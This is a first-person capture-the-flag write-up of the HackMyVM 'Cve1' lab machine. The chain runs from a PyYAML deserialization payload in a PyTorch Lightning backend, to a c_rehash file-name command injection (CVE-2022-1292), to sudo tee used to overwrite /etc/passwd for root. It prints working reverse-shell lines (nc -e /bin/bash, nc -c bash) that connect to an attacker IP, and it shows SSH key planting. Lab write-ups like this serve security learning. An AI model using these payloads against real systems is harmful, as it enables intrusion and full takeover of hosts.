# Cve1

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.185:22
Open 10.0.2.185:80
Open 10.0.2.185:9090
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.185
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a:9a:6c:98:00:a7:c8:66:94:fe:58:7e:61:a7:f9:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGqfVs8cp6bNRqGNIYOt7/IcDejEWkKkO4rT2jNfk0tTzy50zflp5cYQnr28gkb3LmVYV6muVjrPSRPkGdKkNQDa07fFr/ZuujJjnJw8N6SRdqIa3sCqk5xYNU4AG4XXZpQqOXTdFwBzrYFoRUdhum4/uy9/8B+0jQHG5J34fgJW4yoqv3efDV4Mc43mpM7tdBTaGnwroRaCrPMlvcyk3bMvK2cepefHZh0v57JD3MplUzleZspMRNxzNL29QKBLLnli0wcJBYBVMnsaZkaEixequlAfAXA4OiVhI2uJk8K5R0fxwab7IBfEf8BXDE34U14gGZ51tUL7TI/VIe1n/YGtFOPFB9nziZn3Wx2xL2d3AFQxqynXdBOuowqTgj6XMbuLLtE0FEXNiyYBjyZXbBkmBCIztPXzH4C3P6pmQ30dWVcAynlNkSzj/KEEl5x7ba2BXyXQ3NI7Z2P2qmoJ4NA1xlmNePSPtgGZALOJOyHjH0hH+63YZLDAM8l+M7fTc=
|   256 9d:6f:0d:13:02:3c:65:45:79:1b:3d:9b:e2:5e:24:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFZXRJbPQkc2JT7AD5hOJAeMi7oi+ZzVle8jlbTdt1riEbAIXl+YspL7H0GAoWOEi4Xb1ihsk9E+sg720oGYtyw=
|   256 82:ba:54:82:f7:1d:a2:65:fc:9f:25:dc:43:ee:7e:4c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIPJ0cG5mEAOd5CdvGNAjS427G1JCt0Gi4oYtm1QM0ku
80/tcp   open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Debian Default Page: It works
9090/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

![writeup.png](/assets/pentest/hackmyvm/cve1/writeup.png)

Scan for CVEs (because of name)
```bash
‚îî‚îÄ$ nuclei -u http://10.0.2.185 -tags cve,apache
[CVE-2023-48795] [javascript] [medium] 10.0.2.185:22 ["Vulnerable to Terrapin"]
[apache-detect] [http] [info] http://10.0.2.185 ["Apache/2.4.54 (Debian)"]
[default-apache-test-all] [http] [info] http://10.0.2.185 ["Apache/2.4.54 (Debian)"]
[default-apache2-page] [http] [info] http://10.0.2.185
```

```bash
‚îî‚îÄ$ curl http://10.0.2.185/ -Is | grep Server
Server: Apache/2.4.54 (Debian)
```

## HTTP (9090)

There's another web application on 9090. First I tried tinkering with LFI, but nothing worked.

![writeup-1.png](/assets/pentest/hackmyvm/cve1/writeup-1.png)

1. When file is read hidden comment is shown
2. LFI definitely works, but `.yaml` seems to be added at the end
```bash
‚îî‚îÄ$ curl 'http://10.0.2.185:9090/' -d 'submitopen=View+content' -d 'filename=test'
...
    File contents:<br/>
    testing<br /><!--Backend developed with PyTorch Lightning 1.5.9-->

‚îî‚îÄ$ curl 'http://10.0.2.185:9090/' -d 'submitopen=View+content' -d 'filename=/proc/self/cwd/test'
...
    File contents:<br/>
    testing<br /><!--Backend developed with PyTorch Lightning 1.5.9-->
```

- [https://lightning.ai/docs/pytorch/1.6.0/generated/CHANGELOG.html#id6](https://lightning.ai/docs/pytorch/1.6.0/generated/CHANGELOG.html#id6)
	- - Fixed security vulnerabilities CVE-2020-1747 and CVE-2020-14343 caused by the¬†`PyYAML`¬†dependency ([#11099](https://github.com/PyTorchLightning/pytorch-lightning/pull/11099))
- [https://github.com/Lightning-AI/pytorch-lightning/pull/11099/commits/a954487544b1b9ef9d068cc07298e07013222c15](https://github.com/Lightning-AI/pytorch-lightning/pull/11099/commits/a954487544b1b9ef9d068cc07298e07013222c15)

This version is vulnerable to **Yaml Deserialization Attack** because it was using `PyYaml 5.1`

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md#pyyaml](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md#pyyaml)

I tested payloads, but nothing. Maybe it needs to be valid Nuclei template like Yaml?
```bash
‚îî‚îÄ$ cat /home/woyag/.local/nuclei-templates/http/cves/2021/CVE-2021-41773.yaml
id: CVE-2021-41773

info:
  name: Apache 2.4.49 - Path Traversal and Remote Code Execution
  author: daffainfo,666asd
  severity: high
...
```

Still nothing with `id: PAYLOAD`

Scanning the target shows existing `file.yaml`
```bash
‚îî‚îÄ$ feroxbuster -u http://10.0.2.185:9090/ --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .yaml
200      GET       19l       76w      910c http://10.0.2.185:9090/
200      GET        1l        1w        1c http://10.0.2.185:9090/1.yaml    # Me
200      GET        1l        5w       83c http://10.0.2.185:9090/file.yaml # Different
200      GET       19l       76w      910c http://10.0.2.185:9090/index.php
301      GET        9l       28w      320c http://10.0.2.185:9090/javascript => http://10.0.2.185:9090/javascript/
301      GET        9l       28w      316c http://10.0.2.185:9090/manual => http://10.0.2.185:9090/manual/
```

Save payload to `file.yaml`
```bash
!!python/object/apply:subprocess.Popen ¬†[["nc", "10.0.2.149", "4444", "-e", "/bin/bash"]]
```

```bash
‚îî‚îÄ$ penelope -p 4444
www-data@cve-pt1:~/cve$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bruh
```bash
www-data@cve-pt1:~/cve$ cat 2021-4118.py
#!/usr/bin/env python3

from pytorch_lightning import core
core.saving.load_hparams_from_yaml("/var/www/cve/file.yaml")
```

Later googling the method led me to this post
- [Deserialization of Untrusted Data in pytorchlightning/pytorch-lightning](https://huntr.com/bounties/31832f0c-e5bb-4552-a12c-542f81f111e6)

## Lateral Movement

```bash
www-data@cve-pt1:~$ cat /etc/crontab
# Nothing
www-data@cve-pt1:~$ find /etc/cron.* -type f -ls
   130723      4 -rw-r--r--   1 root     root          102 Feb 22  2021 /etc/cron.d/.placeholder
   132022      4 -rw-r--r--   1 root     root          418 Dec  7  2022 /etc/cron.d/cve1
   131870      4 -rw-r--r--   1 root     root          712 May 11  2020 /etc/cron.d/php
   130633      4 -rw-r--r--   1 root     root          201 Jun  7  2021 /etc/cron.d/e2scrub_all
   131455      4 -rw-r--r--   1 root     root          285 Feb  6  2021 /etc/cron.d/anacron
...
```

```bash
www-data@cve-pt1:~$ cat /etc/cron.d/cve1
*/1 * * * * www-data python3 /var/www/cve/2021-4118.py
*/1 * * * * www-data sleep 20; python3 /var/www/cve/2021-4118.py
*/1 * * * * www-data sleep 40; python3 /var/www/cve/2021-4118.py
*/1 * * * * wicca c_rehash /etc/ssl/certs/
*/1 * * * * wicca sleep 30; c_rehash /etc/ssl/certs/
*/1 * * * * root python3 /root/0845.py
*/1 * * * * root sleep 20; python3 /root/0845.py
*/1 * * * * root sleep 40; python3 /root/0845.py
```

```bash
www-data@cve-pt1:~$ cat /etc/cron.d/php
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
```

```bash
‚îî‚îÄ$ man c_rehash
NAME
       openssl-rehash, c_rehash - Create symbolic links to files named by the hash values
```

```bash
www-data@cve-pt1:~$ find -L /etc/ssl/certs/ -user wicca -ls
   131384      0 lrwxrwxrwx   1 wicca    wicca          26 Dec  6  2022 /etc/ssl/certs/.0 -> tmp.crt`bash\ tmprshell.sh`
```

This is vulnerable to command injection. Because of the backticks, the shell executes `bash tmprshell.sh` with the privileges of the user running `c_rehash`.
- **[CVE-2022-1292](https://github.com/alcaparra/CVE-2022-1292)**: OpenSSL c_rehash Vulnerability - POC

We can write in folder
```bash
www-data@cve-pt1:~$ ls /etc/ssl/certs/ -dlah
drwxr-xrwx 2 root root 12K Jan  9 11:23 /etc/ssl/certs/
```

Create malicious script
```bash
www-data@cve-pt1:~$ echo '-----BEGIN CERTIFICATE-----' > '/etc/ssl/certs/hey.crt`nc -c bash 10.0.2.149 4444`'
...
[+] Got reverse shell from cve-pt1~10.0.2.185-Linux-x86_64 üòçÔ∏è Assigned SessionID <6>
[!] Session detached ‚á≤ # F12
(Penelope)‚îÄ(Session [1])> sessions 6
wicca@cve-pt1:/etc/ssl/certs$ id
uid=1000(wicca) gid=1000(wicca) groups=1000(wicca)
```

## SSH

Upgrade shell
```bash
‚îî‚îÄ$ gen_ssh_deploy id_rsa wicca
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/wicca/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOuMCCAhhp97GDVXvQ8lC2sU2F11F7kYnVIeuwgFL2wc woyag@kraken' >> /home/wicca/.ssh/authorized_keys; chmod 700 /home/wicca/.ssh; chmod 600 /home/wicca/.ssh/authorized_keys
```

```bash
‚îî‚îÄ$ ssh -i id_rsa wicca@10.0.2.185
wicca@cve-pt1:~$ id
uid=1000(wicca) gid=1000(wicca) groups=1000(wicca)
```

### User.txt

```bash
wicca@cve-pt1:~$ cat user.txt
HMVM{e49553320c33fa8866cddae2954ee228}
```

## Privilege Escalation

The zip is file protected, Im not sure I want to tinker with it
```bash
wicca@cve-pt1:~$ ls -l
total 8
-rw-r----- 1 wicca wicca 889 Dec  7  2022 Backup.zip
-r-------- 1 wicca wicca  39 Dec  7  2022 user.txt
```

Because we have `tee` as sudo
```bash
wicca@cve-pt1:~$ sudo -l
Matching Defaults entries for wicca on cve-pt1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wicca may run the following commands on cve-pt1:
    (root) NOPASSWD: /usr/bin/tee
```

No SSH login as root
```bash
wicca@cve-pt1:~$ grep Root /etc/ssh/sshd_config
#PermitRootLogin prohibit-password
# the setting of "PermitRootLogin without-password".
```

```bash
wicca@cve-pt1:~$ cp /etc/passwd .
wicca@cve-pt1:~$ echo "pwn:$(openssl passwd -6 -salt y x):0:0:root:/root:/bin/bash" >> passwd
wicca@cve-pt1:~$ cat passwd | sudo tee /etc/passwd
wicca@cve-pt1:~$ timeout 1 echo 'x' | su - pwn -c id
Password: uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
wicca@cve-pt1:~$ timeout 1 echo 'x' | su - pwn -c 'cat /root/root.txt'
Password: HMVM{01cefdb2ed88aa502ec4149bb19ebae6}
```